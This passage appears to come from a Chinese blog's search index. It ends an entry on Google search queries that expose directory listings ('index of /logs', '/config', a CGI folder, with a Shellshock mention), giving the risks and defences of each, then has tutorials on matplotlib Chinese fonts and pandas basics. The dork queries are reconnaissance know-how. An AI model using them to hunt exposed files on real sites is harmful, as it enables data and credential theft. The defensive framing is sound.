脚本目录（常见于老旧系统）。</li><li><strong>风险</strong>：利用 CGI 漏洞（如 Shellshock）执行远程代码。</li><li><strong>防御</strong>：升级或禁用 CGI 模块，设置严格的脚本权限。</li></ul><h4 id="10-“index-of-logs”"><a href="#10-“index-of-logs”" class="headerlink" title="10. “index of /logs”"></a><strong>10. <code>“index of /logs”</code></strong></h4><ul><li><strong>用途</strong>：暴露日志文件目录（如访问日志、错误日志）。</li><li><strong>风险</strong>：日志中可能包含敏感信息（如 SQL 错误中的数据库密码）。</li><li><strong>防御</strong>：将日志存储在非 Web 目录，定期清理并加密存档。</li></ul><h4 id="11-“index-of-config”"><a href="#11-“index-of-config”" class="headerlink" title="11. “index of /config”"></a><strong>11. <code>“index of /config”</code></strong></h4><ul><li><strong>用途</strong>：查找配置文件目录（如数据库连接信息）。</li><li><strong>风险</strong>：泄露 <code>config.php</code>、<code>settings.ini</code> 等文件。</li><li><strong>防御</strong>：将配置文件移出 Web 目录，使用环境变量注入配置。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux设置matplotlib中文字体</title>
      <link href="/2025/01/17/linux-she-zhi-matplotlib-zhong-wen-zi-ti/"/>
      <url>/2025/01/17/linux-she-zhi-matplotlib-zhong-wen-zi-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="linux设置matplotlib中文字体"><a href="#linux设置matplotlib中文字体" class="headerlink" title="linux设置matplotlib中文字体"></a>linux设置matplotlib中文字体</h1><p>在Linux上设置Matplotlib使用中文字体的步骤如下：</p><h3 id="步骤-1-安装中文字体"><a href="#步骤-1-安装中文字体" class="headerlink" title="步骤 1: 安装中文字体"></a>步骤 1: 安装中文字体</h3><p>去<a href="https://github.com/StellarCN/scp_zh/blob/master/fonts/SimHei.ttf">scp_zh/fonts/SimHei.ttf at master · StellarCN/scp_zh</a>下载中文字体</p><h4 id="安装SimHei字体"><a href="#安装SimHei字体" class="headerlink" title="安装SimHei字体"></a>安装SimHei字体</h4><pre class="line-numbers language-none"><code class="language-none">import matplotlib.pyplot as pltfrom matplotlib import rcParamsimport pandas as pd# 设置中文字体rcParams['font.sans-serif'] = ['SimHei']  # 或者使用 'Microsoft YaHei'rcParams['axes.unicode_minus'] = False  # 解决负号显示问题# 示例数据data = {'日期': ['2024-01-01', '2024-01-02', '2024-01-03'],        '销售额': [150, 200, 250]}df = pd.DataFrame(data)# 绘制图表plt.plot(df['日期'], df['销售额'])plt.title('销售额趋势')plt.xlabel('日期')plt.ylabel('销售额')plt.xticks(rotation=45)plt.show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行命令找到配置目录</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlibmatplotlib<span class="token punctuation">.</span>matplotlib_fname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># xxx/matplotlib/matplotlibrc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>修改文件<code>matplotlibrc</code>，找到<code>font.sans-serif: DejaVu Sans, Bitstream Vera Sans, Computer Modern Sans Serif, Lucida Grande, Verdana, Geneva, Lucid, Arial, Helvetica, Avant Garde, sans-serif, SimHei</code></p><pre class="line-numbers language-none"><code class="language-none">vim matplotlibrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>SimHei</code>就是我添加的中文字体</p><p>删除缓存</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/.cache/matplotlib<span class="token function">rm</span> * <span class="token parameter variable">-r</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="步骤-2-配置Matplotlib使用中文字体"><a href="#步骤-2-配置Matplotlib使用中文字体" class="headerlink" title="步骤 2: 配置Matplotlib使用中文字体"></a>步骤 2: 配置Matplotlib使用中文字体</h3><p>测试代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> rcParams<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment"># 设置中文字体</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span>  <span class="token comment"># 或者使用 'Microsoft YaHei'</span>rcParams<span class="token punctuation">[</span><span class="token string">'axes.unicode_minus'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># 解决负号显示问题</span><span class="token comment"># 示例数据</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'日期'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'2024-01-01'</span><span class="token punctuation">,</span> <span class="token string">'2024-01-02'</span><span class="token punctuation">,</span> <span class="token string">'2024-01-03'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'销售额'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 绘制图表</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'日期'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> df<span class="token punctuation">[</span><span class="token string">'销售额'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'销售额趋势'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'日期'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'销售额'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span>rotation<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas使用</title>
      <link href="/2025/01/12/pandas-shi-yong/"/>
      <url>/2025/01/12/pandas-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="pandas使用"><a href="#pandas使用" class="headerlink" title="pandas使用"></a>pandas使用</h1><p><strong>教程框架：</strong></p><ol><li><strong>Pandas 简介与安装</strong><ul><li>什么是 pandas？</li><li>为什么使用 pandas？</li><li>如何安装 pandas？</li></ul></li><li><strong>Pandas 数据结构：Series</strong><ul><li>Series 的创建</li><li>Series 的索引与切片</li><li>Series 的基本操作（算术、逻辑、函数应用）</li><li>Series 的常用属性和方法</li></ul></li><li><strong>Pandas 数据结构：DataFrame</strong><ul><li>DataFrame 的创建</li><li>DataFrame 的索引与选择数据</li><li>DataFrame 的基本操作<ul><li>添加、删除列</li><li>修改数据</li><li>排序</li></ul></li><li>DataFrame 的常用属性和方法</li><li>数据清洗</li></ul></li><li><strong>Pandas 数据操作</strong><ul><li>数据分组 (GroupBy)</li><li>数据聚合 (Aggregation)</li><li>数据合并 (Merge, Join)</li><li>数据连接 (Concat)</li><li>数据透视表 (Pivot Table)</li></ul></li><li><strong>Pandas 文件读写</strong><ul><li>读取 CSV 文件</li><li>读取 Excel 文件</li><li>读取其他类型文件</li><li>写入文件</li></ul></li><li><strong>Pandas 时间序列数据处理</strong><ul><li>时间戳 (Timestamp)</li><li>时间范围 (Date Range)</li><li>时间重采样 (Resampling)</li></ul></li><li><strong>Pandas 高级应用</strong><ul><li>apply 和 applymap 函数</li><li>窗口函数</li><li>数据可视化</li></ul></li><li><strong>总结与进阶</strong><ul><li>常用技巧</li><li>学习资源</li></ul></li></ol><h3 id="1-Pandas-简介与安装"><a href="#1-Pandas-简介与安装" class="headerlink" title="1. Pandas 简介与安装"></a><strong>1. Pandas 简介与安装</strong></h3><p><strong>1.1 什么是 pandas？</strong></p><p>Pandas 是一个强大的 Python 数据分析库，它提供了高效的数据结构和数据分析工具。Pandas 的核心是两种数据结构：Series 和 DataFrame，它们使得数据处理变得简单快捷。</p><ul><li><strong>Series:</strong> 一维的、带标签的数组，类似于带索引的列表。</li><li><strong>DataFrame:</strong> 二维的、表格型的数据结构，可以看作是 Series 的容器。</li></ul><p><strong>1.2 为什么使用 pandas？</strong></p><ul><li><strong>数据处理能力强:</strong> Pandas 提供了各种数据操作功能，如数据清洗、转换、切片、聚合、合并等。</li><li><strong>高效的数据结构:</strong> Series 和 DataFrame 的设计使得数据操作和分析速度快。</li><li><strong>与 NumPy 集成:</strong> Pandas 基于 NumPy 构建，可以无缝地与 NumPy 数组进行交互。</li><li><strong>文件读写方便:</strong> Pandas 可以轻松读取和写入各种格式的文件，如 CSV、Excel、JSON、SQL 等。</li><li><strong>数据可视化支持:</strong> Pandas 可以与 Matplotlib 等可视化库结合，方便进行数据可视化。</li><li><strong>易用性:</strong> Pandas 的 API 设计简洁易懂，上手快。</li></ul><p><strong>1.3 如何安装 pandas？</strong></p><p>推荐使用 pip 来安装 pandas：</p><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">pip install pandas<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果你使用的是 Anaconda，pandas 通常会预装，如果没有，也可以用 conda 安装：</p><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">conda install pandas<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>安装验证:</strong></p><p>打开你的 Python 解释器或 Jupyter Notebook，输入以下代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">print</span><span class="token punctuation">(</span>pd<span class="token punctuation">.</span>__version__<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果正确打印出 pandas 的版本号，就说明安装成功了。</p><hr><h3 id="2-Pandas-数据结构：Series"><a href="#2-Pandas-数据结构：Series" class="headerlink" title="2. Pandas 数据结构：Series"></a><strong>2. Pandas 数据结构：Series</strong></h3><p><strong>2.1 Series 的创建</strong></p><p>Series 是一种一维的、带有标签（索引）的数据结构。它可以存储各种数据类型，如整数、浮点数、字符串、布尔值等。</p><p><strong>2.1.1 从列表创建 Series</strong></p><p>最简单的创建方式是从 Python 的列表创建：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">]</span>s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>    <span class="token number">10</span><span class="token number">1</span>    <span class="token number">20</span><span class="token number">2</span>    <span class="token number">30</span><span class="token number">3</span>    <span class="token number">40</span><span class="token number">4</span>    <span class="token number">50</span>dtype: int64<span class="token operator">&lt;</span>class <span class="token string">'pandas.core.series.Series'</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>默认情况下，Series 会自动创建从 0 开始的整数索引。</li><li>dtype: int64 表示数据类型是 64 位整数。</li></ul><p><strong>2.1.2 从 NumPy 数组创建 Series</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> nparr <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">2.2</span><span class="token punctuation">,</span> <span class="token number">3.3</span><span class="token punctuation">,</span> <span class="token number">4.4</span><span class="token punctuation">,</span> <span class="token number">5.5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>    <span class="token number">1.1</span><span class="token number">1</span>    <span class="token number">2.2</span><span class="token number">2</span>    <span class="token number">3.3</span><span class="token number">3</span>    <span class="token number">4.4</span><span class="token number">4</span>    <span class="token number">5.5</span>dtype: float64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>dtype: float64 表示数据类型是 64 位浮点数。</li></ul><p><strong>2.1.3 从字典创建 Series</strong></p><p>字典的键会成为 Series 的索引，值会成为 Series 的数据：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token number">300</span><span class="token punctuation">}</span>s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a    <span class="token number">100</span>b    <span class="token number">200</span>c    <span class="token number">300</span>dtype: int64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.1.4 自定义索引</strong></p><p>可以在创建 Series 时指定索引：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span>index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">]</span>s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>data<span class="token punctuation">,</span> index<span class="token operator">=</span>index<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">x    <span class="token number">10</span>y    <span class="token number">20</span>z    <span class="token number">30</span>dtype: int64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.2 Series 的索引与切片</strong></p><p>类似于列表和字典，可以使用索引来访问 Series 的元素。</p><p><strong>2.2.1 通过位置索引访问</strong></p><p>使用默认的整数索引：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pds <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出 10</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 输出 b    20</span>             <span class="token comment">#      c    30</span>             <span class="token comment">#      dtype: int64</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.2.2 通过自定义索引访问</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pds <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出 10</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">:</span><span class="token string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 输出 b    20</span>                <span class="token comment">#      c    30</span>                <span class="token comment">#      d    40</span>                <span class="token comment">#      dtype: int64</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.3 Series 的基本操作</strong></p><p><strong>2.3.1 算术运算</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pds1 <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>s2 <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1 <span class="token operator">+</span> s2<span class="token punctuation">)</span>   <span class="token comment"># 加法</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1 <span class="token operator">*</span> s2<span class="token punctuation">)</span>   <span class="token comment"># 乘法</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2 <span class="token operator">/</span> s1<span class="token punctuation">)</span>   <span class="token comment"># 除法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Series 会按照索引对齐进行计算。</p><p><strong>2.3.2 逻辑运算</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pds <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s <span class="token operator">&gt;</span> <span class="token number">20</span><span class="token punctuation">)</span>   <span class="token comment"># 布尔值 Series</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>s <span class="token operator">&gt;</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment"># 选择大于20的元素</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.3.3 函数应用</strong></p><p>可以使用 apply() 方法将函数应用于 Series 的每个元素：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pds <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">square</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> x<span class="token operator">**</span><span class="token number">2</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token builtin">apply</span><span class="token punctuation">(</span>square<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.4 Series 的常用属性和方法</strong></p><ul><li>values: 返回 Series 的值，以 NumPy 数组的形式。</li><li>index: 返回 Series 的索引。</li><li>dtype: 返回 Series 的数据类型。</li><li>size: 返回 Series 的元素个数。</li><li>unique(): 返回 Series 中唯一的值。</li><li>value_counts(): 返回每个值出现的次数。</li><li>head(n): 返回前 n 个元素。</li><li>tail(n): 返回后 n 个元素。</li><li>sort_values(): 对 Series 的值进行排序。</li></ul><p><strong>示例：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pds <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>values<span class="token punctuation">)</span>      <span class="token comment"># 输出 [10 20 10 30 20]</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>index<span class="token punctuation">)</span>       <span class="token comment"># 输出 RangeIndex(start=0, stop=5, step=1)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>dtype<span class="token punctuation">)</span>       <span class="token comment"># 输出 int64</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>size<span class="token punctuation">)</span>        <span class="token comment"># 输出 5</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>unique<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 输出 [10 20 30]</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>value_counts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#输出 10    2</span>                         <span class="token comment">#  20    2</span>                         <span class="token comment">#  30    1</span>                         <span class="token comment"># dtype: int64</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment"># 输出 0    10</span>                         <span class="token comment">#      1    20</span>                         <span class="token comment">#      dtype: int64</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 输出 0    10</span>                       <span class="token comment">#      2    10</span>                       <span class="token comment">#      1    20</span>                       <span class="token comment">#      4    20</span>                       <span class="token comment">#      3    30</span>                       <span class="token comment">#      dtype: int64</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="3-Pandas-数据结构：DataFrame"><a href="#3-Pandas-数据结构：DataFrame" class="headerlink" title="3. Pandas 数据结构：DataFrame"></a><strong>3. Pandas 数据结构：DataFrame</strong></h3><p><strong>3.1 DataFrame 的创建</strong></p><p>DataFrame 是一个二维的表格型数据结构，可以看作是 Series 的容器。它由行和列组成，每一列可以是不同的数据类型。</p><p><strong>3.1.1 从字典创建 DataFrame</strong></p><p>字典的键会成为 DataFrame 的列名，值会成为 DataFrame 的列数据：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'city'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'New York'</span><span class="token punctuation">,</span> <span class="token string">'London'</span><span class="token punctuation">,</span> <span class="token string">'Paris'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">name  age      city<span class="token number">0</span>    Alice   <span class="token number">25</span>  New York<span class="token number">1</span>      Bob   <span class="token number">30</span>    London<span class="token number">2</span>  Charlie   <span class="token number">28</span>     Paris<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.1.2 从列表创建 DataFrame</strong></p><p>可以使用列表的列表或 NumPy 数组创建 DataFrame，需要指定列名：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token string">'New York'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token string">'London'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'Charlie'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token string">'Paris'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">,</span> columns<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">,</span> <span class="token string">'city'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" 